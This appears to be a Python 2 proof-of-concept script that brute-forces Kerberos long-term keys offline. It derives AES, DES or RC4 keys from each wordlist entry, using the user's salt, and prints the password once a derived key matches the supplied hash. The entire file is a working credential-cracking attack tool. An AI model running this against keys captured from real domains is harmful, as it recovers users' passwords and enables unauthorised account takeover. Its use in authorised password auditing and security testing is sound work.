#!/usr/bin/env python
import argparse
import sys
from krb5 import crypto

def create_key(salt, cipher, password):

    # Setup AES Iteration Count for both AES 128 and 256
    iterations = '\x00\x00\x10\x00'

    # Generate Keys based on cipher
    if cipher == "aes256-cts-hmac-sha1-96":
        key = crypto.string_to_key(crypto.Enctype.AES256, password, salt, iterations)
    elif cipher == "aes128-cts-hmac-sha1-96":
        key = crypto.string_to_key(crypto.Enctype.AES128, password, salt, iterations)
    elif cipher == "des-cbc-md5":
        key = crypto.string_to_key(crypto.Enctype.DES_MD5, password, salt)
    elif cipher == "rc4_hmac":
        key = crypto.string_to_key(crypto.Enctype.RC4, password, None)
    else:
        return None
    return ((key.contents).encode("hex"))

def main(wordlist, key):

    # Split kerberos key
    krb = key.split(":")
    salt = krb[0].split("\\")
    fin_salt = salt[0].upper() + salt[1]
    cipher = krb[1]
    fin_key = krb[2]

    # Status
    print "User: %s" % krb[0]
    print "Cipher: %s" % cipher
    print "Testing key: %s" % fin_key

    # Read wordlist
    with open(wordlist) as file:
        for line in file:
            password = line.rstrip('\r\n')
            key = create_key(fin_salt, cipher, password)
            if key == fin_key:
                print "[+] Password found: %s" % password
                break
            elif not key:
                print "[-] Invalid cipher!"
                break

if __name__ == '__main__':

    # Command line arguments
    parser = argparse.ArgumentParser(description="Kerberos POC Bruteforcer")
    parser.add_argument('wordlist', nargs='?', help='Input wordlist')
    parser.add_argument('key', nargs='?', help='Kerberos key with descriptor')
    args = parser.parse_args()
    if not args.wordlist and not args.key:
        parser.print_help()
        sys.exit(2)

    main(args.wordlist,args.key)
